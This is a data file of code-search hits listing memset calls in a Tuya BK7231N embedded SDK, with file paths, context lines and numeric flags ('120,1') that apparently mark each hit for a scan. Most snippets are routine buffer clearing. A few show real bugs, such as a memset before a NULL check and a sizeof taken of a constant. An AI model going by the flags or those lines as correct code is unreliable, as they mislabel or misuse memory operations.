2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\core\test_pbuf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\core\test_pbuf.c,"memset(p->payload, 0, p->len);",120,1,"  /* alloc big enough to get a chain of pbufs */
  fail_if(p->tot_len == p->len);
  memset(p->payload, 0, p->len);
  memset(q->payload, 0, q->len);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\core\test_pbuf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\core\test_pbuf.c,"memset(q->payload, 0, q->len);",120,1,"  fail_if(p->tot_len == p->len);
  memset(p->payload, 0, p->len);
  memset(q->payload, 0, q->len);

  /* copy data to the beginning of first pbuf */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,"memset(&domain, 0, sizeof(domain));",120,1,"  LWIP_UNUSED_ARG(_i);

  memset(&domain, 0, sizeof(domain));
  res = mdns_domain_add_label(&domain, ""multi"", 5);
  fail_unless(res == ERR_OK);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,"memset(&domain1, 0, sizeof(domain1));",120,1,"  LWIP_UNUSED_ARG(_i);

  memset(&domain1, 0, sizeof(domain1));
  res = mdns_domain_add_label(&domain1, ""multi"", 5);
  fail_unless(res == ERR_OK);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,"memset(&domain2, 0, sizeof(domain2));",120,1,"  fail_unless(domain1.length == sizeof(data));

  memset(&domain2, 0, sizeof(domain2));
  res = mdns_domain_add_label(&domain2, ""multi"", 5);
  fail_unless(res == ERR_OK);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,"memset(domain1.name, 0xAA, sizeof(MDNS_DOMAIN_MAXLEN));",120,1,"
  memset(&domain1, 0, sizeof(domain1));
  memset(domain1.name, 0xAA, sizeof(MDNS_DOMAIN_MAXLEN));
  res = mdns_domain_add_label(&domain1, ""multi"", 5);
  fail_unless(res == ERR_OK);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\mdns\test_mdns.c,"memset(domain2.name, 0xBB, sizeof(MDNS_DOMAIN_MAXLEN));",120,1,"
  memset(&domain2, 0, sizeof(domain2));
  memset(domain2.name, 0xBB, sizeof(MDNS_DOMAIN_MAXLEN));
  res = mdns_domain_add_label(&domain2, ""multi"", 5);
  fail_unless(res == ERR_OK);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\tcp_helper.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\tcp_helper.c,"memset(netif, 0, sizeof(struct netif));",120,1,"{
  struct netif *n;
  memset(netif, 0, sizeof(struct netif));
  if (txcounters != NULL) {
    memset(txcounters, 0, sizeof(struct test_tcp_txcounters));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\tcp_helper.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\tcp_helper.c,"memset(txcounters, 0, sizeof(struct test_tcp_txcounters));",120,1,"  memset(netif, 0, sizeof(struct netif));
  if (txcounters != NULL) {
    memset(txcounters, 0, sizeof(struct test_tcp_txcounters));
    netif->state = txcounters;
  }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\test_tcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\test_tcp.c,"memset(&netif, 0, sizeof(netif));",120,1,"
  /* initialize local vars */
  memset(&netif, 0, sizeof(netif));
  IP_ADDR4(&local_ip, 192, 168, 1, 1);
  IP_ADDR4(&remote_ip, 192, 168, 1, 2);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\test_tcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\test_tcp.c,"memset(&counters, 0, sizeof(counters));",120,1,"  data_len = sizeof(data);
  /* initialize counter struct */
  memset(&counters, 0, sizeof(counters));
  counters.expected_data_len = data_len;
  counters.expected_data = data;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\test_tcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\test\unit\tcp\test_tcp.c,"memset(&txcounters, 0, sizeof(txcounters));",120,1,"  EXPECT_RET(txcounters.num_tx_calls == 1);
  EXPECT_RET(txcounters.num_tx_bytes == sizeof(data1) + sizeof(struct tcp_hdr) + sizeof(struct ip_hdr));
  memset(&txcounters, 0, sizeof(txcounters));
 /* ""recv"" ACK for data1 */
  p = tcp_create_rx_segment(pcb, NULL, 0, 0, 4, TCP_ACK);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\app_music.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\app_music.c,"memset( (uint8 *)&app_player, 0, sizeof( app_player_ctrl ) );",120,1,"	uint32 player_flag = app_player.player_flag;
	uint32 schedule_cmd = app_player.schedule_cmd;
	memset( (uint8 *)&app_player, 0, sizeof( app_player_ctrl ) );
	app_player.player_flag = player_flag;
	app_player.schedule_cmd = schedule_cmd;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\app_music.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\app_music.c,"memset( (uint8 *)&app_player, 0, sizeof( app_player ) );",120,1,"	}

	memset( (uint8 *)&app_player, 0, sizeof( app_player ) );
	app_player.player_flag |= (APP_PLAYER_FLAG_PLAY_CONTINOUS|APP_PLAYER_FLAG_PLAY_CYCLE|APP_PLAYER_FLAG_HW_ATTACH);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\app_music.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\app_music.c,"memset( &app_player, 0, sizeof(app_player_ctrl) );",120,1,"	}
	media_uninit();
	memset( &app_player, 0, sizeof(app_player_ctrl) );
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\driver_audio_if.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\driver_audio_if.c,"memset( (uint8_t *)rb, 0, sizeof(driver_ringbuff_t));",120,1,"static void rb_init( driver_ringbuff_t *rb, uint8_t *pbuff, uint16_t len )
{
    memset( (uint8_t *)rb, 0, sizeof(driver_ringbuff_t));

    rb->buffp = pbuff;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\driver_audio_if.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\driver_audio_if.c,"memset((void *)&iis_global_setting, 0, sizeof(driver_iis_global_setting_t));",120,1,"    sddev_control(I2S_DEV_NAME, I2S_HW_SET, (void *)0);
	
	memset((void *)&iis_global_setting, 0, sizeof(driver_iis_global_setting_t));
    iis_global_setting.codec_ops = audio_codec_ops;
	
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(&mp3DecInfo->version, 0, sizeof(MPEGVersion));",120,1,"	//   mp3DecInfo->timePerframe = 0;
#endif
	memset(&mp3DecInfo->version, 0, sizeof(MPEGVersion));

	mp3DecInfo->mainDataBegin = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(sbi,0,sizeof(SubbandInfo));",120,1,"	}
	
	memset(sbi,0,sizeof(SubbandInfo));
	memset(mi,0,sizeof(IMDCTInfo));
	memset(hi,0,sizeof(HuffmanInfo));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(mi,0,sizeof(IMDCTInfo));",120,1,"	
	memset(sbi,0,sizeof(SubbandInfo));
	memset(mi,0,sizeof(IMDCTInfo));
	memset(hi,0,sizeof(HuffmanInfo));
	memset(si,0,sizeof(SideInfo));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(hi,0,sizeof(HuffmanInfo));",120,1,"	memset(sbi,0,sizeof(SubbandInfo));
	memset(mi,0,sizeof(IMDCTInfo));
	memset(hi,0,sizeof(HuffmanInfo));
	memset(si,0,sizeof(SideInfo));
	memset(fh,0,sizeof(FrameHeader));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(si,0,sizeof(SideInfo));",120,1,"	memset(mi,0,sizeof(IMDCTInfo));
	memset(hi,0,sizeof(HuffmanInfo));
	memset(si,0,sizeof(SideInfo));
	memset(fh,0,sizeof(FrameHeader));
	memset(sfi,0,sizeof(ScaleFactorInfo));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(fh,0,sizeof(FrameHeader));",120,1,"	memset(hi,0,sizeof(HuffmanInfo));
	memset(si,0,sizeof(SideInfo));
	memset(fh,0,sizeof(FrameHeader));
	memset(sfi,0,sizeof(ScaleFactorInfo));
	memset(di,0,sizeof(DequantInfo));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(sfi,0,sizeof(ScaleFactorInfo));",120,1,"	memset(si,0,sizeof(SideInfo));
	memset(fh,0,sizeof(FrameHeader));
	memset(sfi,0,sizeof(ScaleFactorInfo));
	memset(di,0,sizeof(DequantInfo));
	memset(l2i,0,sizeof(L2DecodeContext));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(di,0,sizeof(DequantInfo));",120,1,"	memset(fh,0,sizeof(FrameHeader));
	memset(sfi,0,sizeof(ScaleFactorInfo));
	memset(di,0,sizeof(DequantInfo));
	memset(l2i,0,sizeof(L2DecodeContext));
	
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\buffers.c,"memset(l2i,0,sizeof(L2DecodeContext));",120,1,"	memset(sfi,0,sizeof(ScaleFactorInfo));
	memset(di,0,sizeof(DequantInfo));
	memset(l2i,0,sizeof(L2DecodeContext));
	
	mp3DecInfo_pointer->FrameHeaderPS =     (void *)fh;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\mp3dec.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\music_player\Mp3Lib\mp3dec.c,"memset(*inbuf, 0, off_4_lign);",120,1,"			BUF_CUTDOWN_DEBUG(""off_4_lign1:%d\r\n"", off_4_lign);
			if(off_4_lign)
				memset(*inbuf, 0, off_4_lign); // clear the unuse data
			
			mp3DecInfo->decode_state = MP3_DECODE_FIND_SYNC_WORD;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sdio_intf\sdio_intf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sdio_intf\sdio_intf.c,"os_memset(rx_ptr, 0, sizeof(STM32_RXPD_S));",120,1,"
    rx_ptr = (STM32_RXPD_PTR)&frm_hdr_ptr[1];
    os_memset(rx_ptr, 0, sizeof(STM32_RXPD_S));
    rx_ptr->pkt_ptr = 0x36; // 0x4e;
#endif
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sdio_intf\sdio_intf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sdio_intf\sdio_intf.c,"os_memset(&scan_start_ptr->bssid, 0xff, ETH_ALEN);",120,1,"    }

    os_memset(&scan_start_ptr->bssid, 0xff, ETH_ALEN);

    scan_start_ptr->ssid_cnt = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sd_music\sdcard_test.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sd_music\sdcard_test.c,"os_memset(testbuf, 0, 512);",120,1,"	}
	testbuf = os_malloc(512);
    os_memset(testbuf, 0, 512);
	if(testbuf == NULL)
		return 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,"os_memset(uart_io_sim_tx_buf, 0, sizeof(uart_io_sim_tx_buf));",120,1,"void uart_io_sim_tx_buf_init(void)
{
    os_memset(uart_io_sim_tx_buf, 0, sizeof(uart_io_sim_tx_buf));
#if defined INTERRUPT_METHOD
    uart_io_sim_tx_buf_size = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,"os_memset(uart_io_sim_rx_buf, 0, sizeof(uart_io_sim_rx_buf));",120,1,"void uart_io_sim_rx_buf_init(void)
{
    os_memset(uart_io_sim_rx_buf, 0, sizeof(uart_io_sim_rx_buf));

    uart_io_sim_rx_done = false;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,"os_memset(uart_io_sim_rx_buf, 0, UART_IO_SIM_RX_FIFO_MAX_COUNT);",120,1,"            {
                uart_io_sim_rx_buf_current_cnt = 0;
                os_memset(uart_io_sim_rx_buf, 0, UART_IO_SIM_RX_FIFO_MAX_COUNT);
            }
        }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\sim_uart\pwm_uart.c,"os_memset(p_uart_io_sim_tx_buf, 0, UART_IO_SIM_TX_FIFO_MAX_COUNT);",120,1,"        uart_io_sim_tx_buf_current_cnt = 0;
        uart_io_sim_tx_first_start = 1;
        os_memset(p_uart_io_sim_tx_buf, 0, UART_IO_SIM_TX_FIFO_MAX_COUNT);
        p_uart_io_sim_tx_buf[uart_io_sim_tx_buf_size++] = data;
        if(uart_io_sim_tx_buf_size == UART_IO_SIM_TX_FIFO_MAX_COUNT)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\spidma_intf\spidma_intf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\spidma_intf\spidma_intf.c,"os_memset(&spidma_intf, 0, sizeof(SPIDMA_DESC_ST));",120,1,"static void spidma_intfer_config_desc(void* data)
{
    os_memset(&spidma_intf, 0, sizeof(SPIDMA_DESC_ST));
    os_memcpy(&spidma_intf, data, sizeof(TVIDEO_DESC_ST));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\temp_detect\temp_detect.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\temp_detect\temp_detect.c,"os_memset(&tmp_detect_buff[0], 0, sizeof(UINT16)*ADC_TEMP_BUFFER_SIZE);",120,1,"    OSStatus err;

    os_memset(&tmp_detect_buff[0], 0, sizeof(UINT16)*ADC_TEMP_BUFFER_SIZE);

    saradc_config_param_init(&tmp_detect_desc);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\temp_detect\temp_detect.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\temp_detect\temp_detect.c,"os_memset(&tmp_single_buff[0], 0, sizeof(UINT16)*ADC_TEMP_BUFFER_SIZE);",120,1,"static void temp_single_get_desc_init(void)
{
    os_memset(&tmp_single_buff[0], 0, sizeof(UINT16)*ADC_TEMP_BUFFER_SIZE);

    saradc_config_param_init(&tmp_single_desc);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\uart_debug\cmd_evm.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\uart_debug\cmd_evm.c,"os_memset(v_tab, 0, v_len);",120,1,"        if(((header & VISION_HEAD_MASK) == VISION_HEAD) && (len <= v_len))
        {
            os_memset(v_tab, 0, v_len);
            os_memcpy(v_tab, (UINT8*)(BOOT_LOAD_VISION_ADDR + sizeof(UINT32)), len);
            return 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\uart_debug\udebug.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\uart_debug\udebug.c,"os_memset(uart_peek, 0, sizeof(uart_peek));",120,1,"
                    udebug_cnt = 0;
                    os_memset(uart_peek, 0, sizeof(uart_peek));

                    break;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\uart_debug\udebug.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\uart_debug\udebug.c,"os_memset(udebug_buf, 0, sizeof(udebug_buf));",120,1,"            if(0 == udebug_cnt)
            {
                os_memset(udebug_buf, 0, sizeof(udebug_buf));
            }

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\user_driver\BkDriverFlash.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\user_driver\BkDriverFlash.c,"os_memset(buf,0,256);",120,1,"	for(;addr<tmp;addr+=256)
	{
		os_memset(buf,0,256);
    	ddev_read(flash_hdl, (char*)buf, 256, addr);
		os_printf(""read addr:%x\r\n"",addr);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\user_driver\BkDriverPwm.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\user_driver\BkDriverPwm.c,"memset(&param, 0, sizeof(pwm_param_t));",120,1,"    pwm_param_t param;

    memset(&param, 0, sizeof(pwm_param_t));

	group_flag = pwm_check_group(pwm1,pwm2);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\video_transfer\video_transfer.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\video_transfer\video_transfer.c,"os_memset(&tvideo_pool.pool[0], 0, sizeof(UINT8)*TVIDEO_POOL_LEN);",120,1,"    UINT32 i = 0;
    TVIDEO_SND_TYPE snd_type = (TVIDEO_SND_TYPE)((int)data);
    os_memset(&tvideo_pool.pool[0], 0, sizeof(UINT8)*TVIDEO_POOL_LEN);
    co_list_init(&tvideo_pool.free);
    co_list_init(&tvideo_pool.ready);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\extral_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\extral_cli.c,"os_memset(&type, 0x0, sizeof(hal_wifi_init_type_t));",120,1,"    int len;
    
    os_memset(&type, 0x0, sizeof(hal_wifi_init_type_t));

    len = os_strlen(ap_ssid);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\lsig_monitor.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\lsig_monitor.c,"os_memset(&last_rts, 0 , sizeof(last_rts));",120,1,"{
    rts_tbl_num = 0;
    os_memset(&last_rts, 0 , sizeof(last_rts));
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\lsig_monitor.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\lsig_monitor.c,"os_memset(&data[i], 0xFF, 6);",120,1,"    os_memcpy(&data[i], rts_tbl[index].ta, 6);
    i+=6;
    os_memset(&data[i], 0xFF, 6);
    i+=6;
    
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\lsig_monitor.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\lsig_monitor.c,"os_memset(&data[i], 0, 4);",120,1,"    data[i++] = 0;

    os_memset(&data[i], 0, 4);
    if (rts_tbl[index].security == WLAN_ENC_CCMP) {
        data[i+3] = 0x20;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset((void *)&argv, 0, sizeof(argv));",120,1,"    const char *p;

    os_memset((void *)&argv, 0, sizeof(argv));
    os_memset(&stat, 0, sizeof(stat));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(&stat, 0, sizeof(stat));",120,1,"
    os_memset((void *)&argv, 0, sizeof(argv));
    os_memset(&stat, 0, sizeof(stat));

    do
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(pCli->outbuf, 0, OUTBUF_SIZE);",120,1,"        return 1;

    os_memset(pCli->outbuf, 0, OUTBUF_SIZE);
    cli_putstr(""\r\n"");
	
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"memset(inbuf, 0, len);",120,1,"                        if(0 == cli_getchar(&ch))
                        { 
                            memset(inbuf, 0, len);
                            *bp = 0;
                            
"
